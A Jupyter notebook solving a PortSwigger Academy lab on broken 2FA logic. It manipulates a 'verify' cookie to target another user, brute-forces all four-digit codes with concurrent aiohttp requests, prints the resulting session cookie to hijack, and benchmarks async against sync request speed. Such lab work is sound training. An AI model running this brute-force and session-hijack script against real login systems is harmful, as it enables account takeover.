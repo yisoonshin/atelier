{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Context\n",
    "\n",
    "In a lab from Portswigger Academy, we are presented a situation where manipulating a cookie value will allow us to generate a 2FA verification code for the target account.\n",
    "https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-broken-logic\n",
    "\n",
    "The goal from that point is to brute force the verification code (302 = success). \n",
    "Making the requests is the easy part (can use Burp Intruder), but the problem is the speed at which we arrive at the correct code. 4 digits is 10k (10 digits ^ 4) possibilities. We aren't necessarily able to 'vectorize' this operation, but we can make requests in larger batches asychronously."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "import random\n",
    "import requests\n",
    "import asyncio\n",
    "import aiohttp\n",
    "import time"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "302\n",
      "\n"
     ]
    }
   ],
   "source": [
    "# Testing out the normal Requests logic and setting up our header + data payloads\n",
    "# using the account we have access to to obtain the verification code.\n",
    "\n",
    "cookies = {\n",
    "    'session':'5391KEjzRb1XYfeMStw5faYh9RNA8vQ1',\n",
    "    'verify':'wiener' # This is what enables the code to be generated\n",
    "}\n",
    "\n",
    "# CSRF prevention token - the post request will not work without it\n",
    "csrf = 'sfdBiLUUAy3IQvjBB5FFZVwD693uRnbl'\n",
    "\n",
    "payload = {\n",
    "    'csrf':csrf,\n",
    "    'mfa-code':'1300'\n",
    "}\n",
    "\n",
    "# Code is generated when this page is visited\n",
    "url = 'https://acab1fe11f27831180747053006c00ca.web-security-academy.net/login2'\n",
    "\n",
    "# Need to have redirects disabled to confirm that the code is correct\n",
    "attempt = requests.post(url=url, cookies = cookies, data = payload, allow_redirects=False)\n",
    "\n",
    "print(attempt.status_code)\n",
    "print(attempt.text)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "302\n",
      "\n"
     ]
    }
   ],
   "source": [
    "# Test asynchronous method using aiohttp.\n",
    "\n",
    "cookies = {\n",
    "    'session':'0gEiHPn88a67jpYYpmpKF4slvwjktbye',\n",
    "    'verify':'wiener'\n",
    "}\n",
    "\n",
    "csrf = 'CTxtlMbeNu6LvGdttNAuNYU1haiudozH'\n",
    "payload = {\n",
    "    'csrf':csrf,\n",
    "    'mfa-code':'0107'\n",
    "}\n",
    "url = 'https://acab1fe11f27831180747053006c00ca.web-security-academy.net/login2'\n",
    "\n",
    "# async and await must be used for these 'co-routines'\n",
    "async with aiohttp.ClientSession(cookies=cookies) as session:\n",
    "    async with session.post(url=url, data=payload, allow_redirects=False) as attempt:\n",
    "        print(attempt.status)\n",
    "        print(await attempt.text())"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "['0000', '0001', '0002', '0003', '0004', '0005', '0006', '0007', '0008', '0009'] \n",
      " ['8737', '5994', '9354', '9597', '2714', '5452', '6286', '5895', '5040', '6415']\n"
     ]
    }
   ],
   "source": [
    "# Now to generate our fuzzing values (left padded w/zeroes). \n",
    "digits = 4\n",
    "# Convert the integer range to strings left-padded with 0\n",
    "possibilities = [f'{i:0{digits}}' for i in range(0, 10 ** digits)]\n",
    "\n",
    "# Randomize order to make it less obvious.\n",
    "random.seed(1337)\n",
    "fuzzing = random.sample(possibilities, len(possibilities))\n",
    "\n",
    "# Test outputs.\n",
    "test = fuzzing[:10]\n",
    "print(possibilities[:10], '\\n', test)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {
    "scrolled": true
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Attempt 1 200\n",
      "Attempt 2 200\n",
      "Attempt 3 200\n",
      "Attempt 4 200\n",
      "Attempt 5 200\n",
      "Attempt 6 200\n",
      "Attempt 7 200\n",
      "Attempt 8 200\n",
      "Attempt 9 200\n",
      "Attempt 10 200\n",
      "4.472953796386719\n"
     ]
    }
   ],
   "source": [
    "# Speed test the standard looping method.\n",
    "\n",
    "cookies = {\n",
    "    'session':'6Wo9Aw13SvZDhqDvfjko031OSdMPsD3x',\n",
    "    'verify':'wiener'\n",
    "}\n",
    "\n",
    "csrf = '9VydJhbje3ohI1zt97mv0BgSUBk1crQQ'\n",
    "url = 'https://acab1fe11f27831180747053006c00ca.web-security-academy.net/login2'\n",
    "\n",
    "sync_start = time.time()\n",
    "with requests.Session() as s:\n",
    "    s.cookies = requests.cookies.cookiejar_from_dict(cookies)\n",
    "    for code in test:\n",
    "        payload = {\n",
    "        'csrf':csrf,\n",
    "        'mfa-code':code\n",
    "        }\n",
    "        try:\n",
    "            attempt = s.post(url=url, cookies=cookies, data=payload)\n",
    "            print(f'Attempt {fuzzing.index(code) + 1}', attempt.status_code)\n",
    "        except:\n",
    "            pass\n",
    "    \n",
    "sync_perf = time.time() - sync_start\n",
    "print(sync_perf)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {
    "scrolled": true
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Attempt 6 5452 200\n",
      "Attempt 1 8737 200\n",
      "Attempt 5 2714 200\n",
      "Attempt 10 6415 200\n",
      "Attempt 7 6286 200\n",
      "Attempt 4 9597 200\n",
      "Attempt 3 9354 200\n",
      "Attempt 8 5895 200\n",
      "Attempt 2 5994 200\n",
      "Attempt 9 5040 200\n",
      "0.47961997985839844\n"
     ]
    }
   ],
   "source": [
    "# Speed test the async method\n",
    "\n",
    "cookies = {\n",
    "    'session':'6Wo9Aw13SvZDhqDvfjko031OSdMPsD3x',\n",
    "    'verify':'wiener'\n",
    "}\n",
    "\n",
    "csrf = '9VydJhbje3ohI1zt97mv0BgSUBk1crQQ'\n",
    "url = 'https://acab1fe11f27831180747053006c00ca.web-security-academy.net/login2'\n",
    "\n",
    "# Create async function\n",
    "async def attempt(code, lst, session):\n",
    "    payload = {\n",
    "        'csrf':csrf,\n",
    "        'mfa-code':code\n",
    "    }\n",
    "    try:\n",
    "        async with session.post(url=url, data=payload) as attempt:\n",
    "            print(f'Attempt {lst.index(code) + 1}', code, attempt.status)\n",
    "    except:\n",
    "        pass\n",
    "    \n",
    "async_start = time.time()\n",
    "async with aiohttp.ClientSession(cookies=cookies) as session:\n",
    "    # Cap on max concurrent\n",
    "    sem = asyncio.Semaphore(100)\n",
    "    async with sem:\n",
    "        await asyncio.gather(*[attempt(code, fuzzing, session) for code in test])\n",
    "        \n",
    "async_perf = time.time() - async_start\n",
    "print(async_perf)\n",
    "\n",
    "# Notice how these aren't in order since responses are retrieved asynchronously\n",
    "# This method is ~10x faster!"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "metadata": {
    "scrolled": true
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Set-Cookie: session=BULlS7oGME3cBvkHfDRsizmFQP7dLeGy; Domain=ac861f031e45d52180a946ea00b9000f.web-security-academy.net; HttpOnly; Path=/; Secure\n"
     ]
    },
    {
     "ename": "CancelledError",
     "evalue": "",
     "output_type": "error",
     "traceback": [
      "\u001b[0;31m---------------------------------------------------------------------\u001b[0m",
      "\u001b[0;31mCancelledError\u001b[0m                      Traceback (most recent call last)",
      "\u001b[0;32m<ipython-input-16-68a3e321b404>\u001b[0m in \u001b[0;36m<module>\u001b[0;34m\u001b[0m\n\u001b[1;32m     32\u001b[0m     \u001b[0msem\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0masyncio\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mSemaphore\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;36m100\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m     33\u001b[0m     \u001b[0;32masync\u001b[0m \u001b[0;32mwith\u001b[0m \u001b[0msem\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m---> 34\u001b[0;31m         \u001b[0;32mawait\u001b[0m \u001b[0masyncio\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mgather\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m*\u001b[0m\u001b[0;34m[\u001b[0m\u001b[0mattempt\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mcode\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mfuzzing\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0msession\u001b[0m\u001b[0;34m)\u001b[0m \u001b[0;32mfor\u001b[0m \u001b[0mcode\u001b[0m \u001b[0;32min\u001b[0m \u001b[0mfuzzing\u001b[0m\u001b[0;34m]\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m",
      "\u001b[0;31mCancelledError\u001b[0m: "
     ]
    }
   ],
   "source": [
    "# Let's obtain the code for carlos\n",
    "\n",
    "cookies = {\n",
    "    'session':'VzSeyXA9pRh7GQgfpXQFAomqoGZaeW8p',\n",
    "    'verify':'carlos'\n",
    "}\n",
    "\n",
    "csrf = 'R59rdupwmhoRxXTe0OXSAuNGOqXdZpb4'\n",
    "url = 'https://ac861f031e45d52180a946ea00b9000f.web-security-academy.net/login2'\n",
    "\n",
    "async def attempt(code, lst, session):\n",
    "    payload = {\n",
    "        'csrf':csrf,\n",
    "        'mfa-code':code\n",
    "    }\n",
    "    \n",
    "    try:\n",
    "        async with session.post(url=url, data=payload, allow_redirects=False) as attempt:\n",
    "            # print(f'Attempt {lst.index(code) + 1}', code, attempt.status)\n",
    "            if attempt.status == 302:\n",
    "                # show the session cookie to hijack\n",
    "                print(attempt.cookies['session'])\n",
    "                # Stop the process since we have the right code. \n",
    "                # You may need to still kill the cell manually\n",
    "                await session.close()\n",
    "    except:\n",
    "        pass\n",
    "\n",
    "\n",
    "async with aiohttp.ClientSession(cookies=cookies) as session:\n",
    "    # Cap on max concurrent\n",
    "    sem = asyncio.Semaphore(100)\n",
    "    async with sem:\n",
    "        await asyncio.gather(*[attempt(code, fuzzing, session) for code in fuzzing])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Let's try testing the two methods across various volumes of attempts to see how they\n",
    "# diverge in performance at scale\n",
    "\n",
    "# Remove the valid code from the possibilities to avoid having the script cut short\n",
    "negatives = [code for code in fuzzing if code != '0313']\n",
    "sample_sizes = [50, 100, 200, 500, 1000]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "21.22771167755127\n",
      "42.906562089920044\n",
      "84.51398491859436\n",
      "208.93131732940674\n",
      "463.4341895580292\n",
      "{'method': 'requests', 'performance': {50: 21.22771167755127, 100: 42.906562089920044, 200: 84.51398491859436, 500: 208.93131732940674, 1000: 463.4341895580292}}\n"
     ]
    }
   ],
   "source": [
    "# Request looping trials\n",
    "sync_dict = {\n",
    "    'method':'requests',\n",
    "    'performance': {}\n",
    "}\n",
    "\n",
    "# Speed test the standard looping method.\n",
    "cookies = {\n",
    "    'session':'D7f2DNDloKYuRnaMby4KUV8tvQOkNwQa',\n",
    "    'verify':'wiener'\n",
    "}\n",
    "\n",
    "csrf = 'DgKMuMDBF62V7yrbqBhNvEx5V1rA421M'\n",
    "url = 'https://ac3a1f3b1f5a6b9c80e43b1d00f3000f.web-security-academy.net/login2'\n",
    "\n",
    "for size in sample_sizes:\n",
    "    sync_start = time.time()\n",
    "    with requests.Session() as s:\n",
    "        s.cookies = requests.cookies.cookiejar_from_dict(cookies)\n",
    "        for code in fuzzing[:size]:\n",
    "            payload = {\n",
    "            'csrf':csrf,\n",
    "            'mfa-code':code\n",
    "            }\n",
    "            try:\n",
    "                attempt = s.post(url=url, cookies=cookies, data=payload)\n",
    "                # Just arbitrarily performing an operation on the returned value\n",
    "                # to simulate our printouts\n",
    "                status = attempt.status_code\n",
    "            except:\n",
    "                pass\n",
    "    \n",
    "    sync_perf = time.time() - sync_start\n",
    "    print(sync_perf)\n",
    "    # log a record of size:performance\n",
    "    sync_dict['performance'][size] = sync_perf\n",
    "    \n",
    "print(sync_dict)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "0.4211421012878418\n",
      "0.4425525665283203\n",
      "0.49524712562561035\n",
      "0.44407010078430176\n",
      "0.4386289119720459\n",
      "{'method': 'aiohttp', 'performance': {50: 0.4211421012878418, 100: 0.4425525665283203, 200: 0.49524712562561035, 500: 0.44407010078430176, 1000: 0.4386289119720459}}\n"
     ]
    }
   ],
   "source": [
    "# aiohttp trials\n",
    "async_dict = {\n",
    "    'method':'aiohttp',\n",
    "    'performance': {}\n",
    "}\n",
    "\n",
    "# Speed test the async method.\n",
    "cookies = {\n",
    "    'session':'D7f2DNDloKYuRnaMby4KUV8tvQOkNwQa',\n",
    "    'verify':'wiener'\n",
    "}\n",
    "\n",
    "csrf = 'DgKMuMDBF62V7yrbqBhNvEx5V1rA421M'\n",
    "url = 'https://ac3a1f3b1f5a6b9c80e43b1d00f3000f.web-security-academy.net/login2'\n",
    "\n",
    "# Create async function\n",
    "async def attempt(code, lst, session):\n",
    "    payload = {\n",
    "        'csrf':csrf,\n",
    "        'mfa-code':code\n",
    "    }\n",
    "    try:\n",
    "        async with session.post(url=url, data=payload) as attempt:\n",
    "            status = attempt.status\n",
    "    except:\n",
    "        pass\n",
    "\n",
    "for size in sample_sizes:\n",
    "    async_start = time.time()\n",
    "    async with aiohttp.ClientSession(cookies=cookies) as session:\n",
    "        # Cap on max concurrent\n",
    "        sem = asyncio.Semaphore(100)\n",
    "        async with sem:\n",
    "            await asyncio.gather(*[attempt(code, fuzzing, session) for code in test])\n",
    "\n",
    "    async_perf = time.time() - async_start\n",
    "    print(async_perf)\n",
    "    # log a record of size:performance\n",
    "    async_dict['performance'][size] = async_perf\n",
    "    \n",
    "print(async_dict)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>attempts</th>\n",
       "      <th>method</th>\n",
       "      <th>performance</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>50</td>\n",
       "      <td>requests</td>\n",
       "      <td>21.227712</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>100</td>\n",
       "      <td>requests</td>\n",
       "      <td>42.906562</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>200</td>\n",
       "      <td>requests</td>\n",
       "      <td>84.513985</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>500</td>\n",
       "      <td>requests</td>\n",
       "      <td>208.931317</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>1000</td>\n",
       "      <td>requests</td>\n",
       "      <td>463.434190</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>5</th>\n",
       "      <td>50</td>\n",
       "      <td>aiohttp</td>\n",
       "      <td>0.421142</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>6</th>\n",
       "      <td>100</td>\n",
       "      <td>aiohttp</td>\n",
       "      <td>0.442553</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>7</th>\n",
       "      <td>200</td>\n",
       "      <td>aiohttp</td>\n",
       "      <td>0.495247</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>8</th>\n",
       "      <td>500</td>\n",
       "      <td>aiohttp</td>\n",
       "      <td>0.444070</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>9</th>\n",
       "      <td>1000</td>\n",
       "      <td>aiohttp</td>\n",
       "      <td>0.438629</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "   attempts    method  performance\n",
       "0        50  requests    21.227712\n",
       "1       100  requests    42.906562\n",
       "2       200  requests    84.513985\n",
       "3       500  requests   208.931317\n",
       "4      1000  requests   463.434190\n",
       "5        50   aiohttp     0.421142\n",
       "6       100   aiohttp     0.442553\n",
       "7       200   aiohttp     0.495247\n",
       "8       500   aiohttp     0.444070\n",
       "9      1000   aiohttp     0.438629"
      ]
     },
     "execution_count": 12,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "import pandas as pd\n",
    "import seaborn as sns\n",
    "import matplotlib.pyplot as plt\n",
    "\n",
    "trials = pd.concat([pd.DataFrame(sync_dict),pd.DataFrame(async_dict)]).\\\n",
    "    reset_index().rename(columns={'index':'attempts'})\n",
    "trials.head(10)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>attempts</th>\n",
       "      <th>aiohttp</th>\n",
       "      <th>requests</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>50</td>\n",
       "      <td>0.421142</td>\n",
       "      <td>21.227712</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>100</td>\n",
       "      <td>0.442553</td>\n",
       "      <td>42.906562</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>200</td>\n",
       "      <td>0.495247</td>\n",
       "      <td>84.513985</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>500</td>\n",
       "      <td>0.444070</td>\n",
       "      <td>208.931317</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>1000</td>\n",
       "      <td>0.438629</td>\n",
       "      <td>463.434190</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "   attempts   aiohttp    requests\n",
       "0        50  0.421142   21.227712\n",
       "1       100  0.442553   42.906562\n",
       "2       200  0.495247   84.513985\n",
       "3       500  0.444070  208.931317\n",
       "4      1000  0.438629  463.434190"
      ]
     },
     "execution_count": 13,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# reshape to have the method observations as their own column\n",
    "pivot = trials.pivot(index='attempts', columns='method', values='performance').\\\n",
    "    reset_index()\n",
    "pivot.columns.name = None\n",
    "pivot.head()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>attempts</th>\n",
       "      <th>aiohttp</th>\n",
       "      <th>requests</th>\n",
       "      <th>delta</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>50</td>\n",
       "      <td>0.421142</td>\n",
       "      <td>21.227712</td>\n",
       "      <td>49.405105</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>100</td>\n",
       "      <td>0.442553</td>\n",
       "      <td>42.906562</td>\n",
       "      <td>95.952465</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>200</td>\n",
       "      <td>0.495247</td>\n",
       "      <td>84.513985</td>\n",
       "      <td>169.650127</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>500</td>\n",
       "      <td>0.444070</td>\n",
       "      <td>208.931317</td>\n",
       "      <td>469.491747</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>1000</td>\n",
       "      <td>0.438629</td>\n",
       "      <td>463.434190</td>\n",
       "      <td>1055.551853</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "   attempts   aiohttp    requests        delta\n",
       "0        50  0.421142   21.227712    49.405105\n",
       "1       100  0.442553   42.906562    95.952465\n",
       "2       200  0.495247   84.513985   169.650127\n",
       "3       500  0.444070  208.931317   469.491747\n",
       "4      1000  0.438629  463.434190  1055.551853"
      ]
     },
     "execution_count": 14,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# How much worse is the requests method as we scale?\n",
    "pivot['delta'] = abs(pivot['requests'] - pivot['aiohttp'])/pivot['aiohttp']\n",
    "pivot.head()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "metadata": {
    "scrolled": false
   },
   "outputs": [
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 432x288 with 1 Axes>"
      ]
     },
     "metadata": {
      "needs_background": "light"
     },
     "output_type": "display_data"
    }
   ],
   "source": [
    "fig, ax = plt.subplots()\n",
    "ax = sns.lineplot(x='attempts', y='aiohttp', data=pivot, \n",
    "                  label='async', color='green')\n",
    "ax = sns.lineplot(x='attempts', y='requests', data=pivot, \n",
    "                  label='sync', color='blue')\n",
    "ax.set(ylabel='Seconds to Complete',\n",
    "       title='Performance Gains from Asynchronous Brute Force')\n",
    "\n",
    "ax.legend()\n",
    "plt.show()"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.8.5"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
